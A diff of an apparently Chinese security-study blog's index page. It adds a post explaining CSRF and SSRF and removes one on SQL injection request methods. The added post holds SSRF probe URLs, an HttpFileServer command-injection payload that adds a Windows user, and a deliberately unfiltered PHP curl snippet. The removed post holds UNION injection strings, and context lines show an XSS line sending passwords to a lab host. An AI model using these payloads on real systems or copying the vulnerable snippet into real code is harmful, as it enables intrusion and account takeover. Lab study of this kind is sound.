@@ -64,6 +64,71 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CSRF和SSRF漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2021-11-01T08:32:30.000Z" itemprop="datePublished">2021-11-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/">CSRF</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="CSRF漏洞解释，原理"><a href="#CSRF漏洞解释，原理" class="headerlink" title="CSRF漏洞解释，原理"></a>CSRF漏洞解释，原理</h4><p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。</p>
+<p>原理：</p>
+<p>CSRF攻击攻击原理及过程如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 用户打开浏览器，访问受信任银行网站，输入用户名和密码请求登录网站；</span><br><span class="line"><span class="number">2.</span>在用户信息通过验证后，银行网站产生Cookie信息并返回给浏览器，此时用户登录网站成功，可以正常发送请求到网站；</span><br><span class="line"><span class="number">3.</span> 用户未退出银行网站之前，在同一浏览器中，打开一个TAB页访问其他网站B</span><br><span class="line"><span class="number">4.</span> 这时候网站B 已被黑客注入诱导信息，加入是一张图片,图片地址指向</span><br><span class="line">  src=”http:<span class="comment">//bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=黑客</span></span><br><span class="line">  点击之后转账给黑客这个账户</span><br><span class="line"><span class="number">5.</span> 浏览器在接收到这些攻击性代码请求后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，根据用户的Cookie信息以C的权限处理该请求，导致来自黑客请求恶意代码被执行。 </span><br></pre></td></tr></table></figure>
+
+<p>这是原理, 攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ffb99fc70646">https://www.jianshu.com/p/ffb99fc70646</a></p>
+<h4 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h4><p>1、当用户发送重要的请求时需要输入原始密码<br>2、设置随机Token<br>3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）<br>4、设置验证码<br>5、限制请求方式只能为 POST</p>
+<h5 id="随机token"><a href="#随机token" class="headerlink" title="随机token"></a>随机token</h5><p>Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p>
+<h4 id="SSRF漏洞解释，原理"><a href="#SSRF漏洞解释，原理" class="headerlink" title="SSRF漏洞解释，原理"></a>SSRF漏洞解释，原理</h4><p>参考：<a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-41070.html">https://www.t00ls.net/articles-41070.html</a></p>
+<p>SSRF(Server-Side Request Forgery 服务器请求伪造)<br>目标：从外网无法访问的内部系统<br>形成原因：服务端提供了从其他服务器获取信息的功能，但没有对内网目标地址做过滤与限制<br>挖掘：从web功能上寻找   参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/kuiguowei/article/details/79070999">https://blog.csdn.net/kuiguowei/article/details/79070999</a><br>    1)分享:通过URL地址分享网页内容<br>    2)转码服务: 通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览   <a target="_blank" rel="noopener" href="http://101.201.64.215:8088/">http://101.201.64.215:8088/</a><br>    3)在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等<br>    4)图片加载与下载: 通过URL地址加载或下载图片<br>    5)图片、文章收藏功能<br>    6)未公开的api实现以及其他调用URL的功能</p>
+<p>私有地址：<br>10.0.0.0 - 10.255.255.255<br>172.16.0.0 - 172.31.255.255<br>192.168.0.0 - 192.168.255.255</p>
+<h5 id="上传图片、视频方式"><a href="#上传图片、视频方式" class="headerlink" title="上传图片、视频方式"></a>上传图片、视频方式</h5><p>1、本地上传<br>2、远程上传</p>
+<h5 id="利用各种协议进行探针："><a href="#利用各种协议进行探针：" class="headerlink" title="利用各种协议进行探针："></a>利用各种协议进行探针：</h5><p><a target="_blank" rel="noopener" href="http://192.168.80.134/phpmyadmin/">http://192.168.80.134/phpmyadmin/</a><br>file://C:/<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict://192.168.80.134:3306/info<br><a href="ftp://192.168.80.134/">ftp://192.168.80.134:21</a></p>
+<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>​    Pikachu-CSRF实验<br>​    Pikachu-CSRF防御-token测试<br>​    SSRF漏洞本地靶场演示_HttpFileServer应用测试<br>​    参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30527323/article/details/94862967">https://blog.csdn.net/weixin_30527323/article/details/94862967</a><br>​    <a target="_blank" rel="noopener" href="http://192.168.80.134:8080/?search==%00%7B.exec%7Ccmd.exe">http://192.168.80.134:8080/?search==%00{.exec|cmd.exe</a> /c net user test1234 1234 /add.}</p>
+<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ffb99fc70646">https://www.jianshu.com/p/ffb99fc70646</a>   CSRF漏洞原理<br><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-41070.html">https://www.t00ls.net/articles-41070.html</a>    SSRF漏洞</p>
+<p>本地测试代码：</p>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<form action="" method="POST">
+请输入图片地址：<input type='text' name='url'>
+<input type='submit' value="提交">
+</form>
+<?php
+$_POST['url'];
+$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_POST['url']);
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_exec($ch);
+curl_close($ch);
+?>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckvgf14ij0000xkvj09il9lm3" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-xss漏洞-过滤绕过及工具使用" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="article-date">
@@ -102,7 +167,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckvc107x6000o70vjebapa038" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckvgf14jm000sxkvj33npcarc" class="article-share-link">Share</a>
       
       
     </footer>
@@ -155,7 +220,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckvc107x5000n70vjhv6fbqs5" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckvgf14ji000pxkvjeh7ehtiv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -199,7 +264,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="ckvc107xb000y70vjh2u80z4n" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="ckvgf14jt000zxkvjf1y86g4b" class="article-share-link">Share</a>
       
       
     </footer>
@@ -244,7 +309,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/" data-id="ckvc107xi001170vj663g7jkv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/" data-id="ckvgf14ju0011xkvj4dxa0met" class="article-share-link">Share</a>
       
       
     </footer>
@@ -297,7 +362,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" data-id="ckvc107xe000z70vjfnvtfkyq" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" data-id="ckvgf14jv0014xkvj459i7rbe" class="article-share-link">Share</a>
       
       
     </footer>
@@ -342,7 +407,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%AA%8C%E8%AF%81%E8%BF%87%E6%BB%A4/" data-id="ckvc107xi001070vjecsi0xp4" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%AA%8C%E8%AF%81%E8%BF%87%E6%BB%A4/" data-id="ckvgf14ju0012xkvj2nkado2p" class="article-share-link">Share</a>
       
       
     </footer>
@@ -403,7 +468,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/08/sql%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E6%89%A9%E5%B1%95%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/" data-id="ckvc107x4000l70vj50ogcj9k" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/08/sql%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E6%89%A9%E5%B1%95%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/" data-id="ckvgf14jf000lxkvjbpuz1mgh" class="article-share-link">Share</a>
       
       
     </footer>
@@ -462,7 +527,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/" data-id="ckvc107x3000j70vj3kg20fs2" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/" data-id="ckvgf14jf000kxkvj6wo884rj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -508,50 +573,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" data-id="ckvc107x4000m70vj7why8viy" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sql注入类型和请求方法" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" class="article-date">
-  <time datetime="2021-09-27T11:44:29.000Z" itemprop="datePublished">2021-09-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/">sql注入请求方法</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="参数类型"><a href="#参数类型" class="headerlink" title="参数类型"></a>参数类型</h4><p>1、数字类型<br>select * from user where id=1<br>2、字符类型<br>select * from user where name=’yucedu’<br>过滤’(单引号)和”(双引号)<br>3、搜索类型<br>select * from user where name like ‘%yucedu%’    只要有yucedu都会被搜索出来<br>过滤%(百分号)和’(单引号)<br>4、JSON类型<br>★post提交方式中的一种数据交互格式<br>   JSON格式：<br>      json={“name”:”yucedu”<br>    “age”:”18”}</p>
-<p>必须将语句的符号闭合，使注入语句生效<br>注释符号：–+,#   有时候–+用不了就用#</p>
-<p>$id=$_GET[‘id’];<br>?id=1 and 1=2 union select 1,2,3–+<br>$sql=”SELECT * FROM users WHERE id=’1 and 1=2 union select 1,2,3–+’ LIMIT 0,1”;<br>?id=1’ and 1=2 union select 1,2,3–+<br>$sql=”SELECT * FROM users WHERE id=’1’ and 1=2 union select 1,2,3–+’ LIMIT 0,1”;</p>
-<h5 id="SQL语句干扰符号"><a href="#SQL语句干扰符号" class="headerlink" title="SQL语句干扰符号"></a>SQL语句干扰符号</h5><p>​     ‘(单引号)，”(双引号)，%(百分号)，)(小括号)，}(大括号) 等，具体需看写法</p>
-<h4 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h4><p>GET、POST、COOKIE、REQUEST、HTTP头部等</p>
-<p>GET请求传输的数据量限制在2KB左右<br>GET只要在url上，就能接收到请求<br>REQUEST请求不管是GET和POST都可以<br>HTTP报文头部各个参数都能注入，比如User-Agent、Cookie</p>
-<h4 id="演示实验"><a href="#演示实验" class="headerlink" title="演示实验"></a>演示实验</h4><p> 参数字符型注入测试   sqlilabs Less-1,2,3,4<br> POST数据提交注入测试   sqliabs Less-11<br> COOKIE数据提交注入测试   sqlilabs Less-20<br> HTTP头部参数数据注入测试   sqlilabs Less-18<br> 参数JSON数据注入测试     <a target="_blank" rel="noopener" href="https://tianchi.aliyun.com/competition/entrance/531796/information">https://tianchi.aliyun.com/competition/entrance/531796/information</a><br>      $sql=”select * from users where username=’{&amp;username}’”;<br>       json={“username”:”admin’ and 1=2 union select 1,2,3#”}        ‘ (单引号)闭合的是SQL语句中的 ‘   </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" data-id="ckvc107x2000h70vj7a8f0pxb" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" data-id="ckvgf14jg000mxkvj891c2bz8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -584,7 +606,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
     </div>
   </div>
 
@@ -595,6 +617,10 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/">CSRF</a>
+          </li>
         
           <li>
             <a href="/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">xss漏洞-过滤绕过及工具使用</a>
@@ -610,10 +636,6 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
         
           <li>
             <a href="/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/">文件上传漏洞的上传逻辑安全</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/">文件上传漏洞的后端绕过方法</a>
           </li>
         
       </ul>
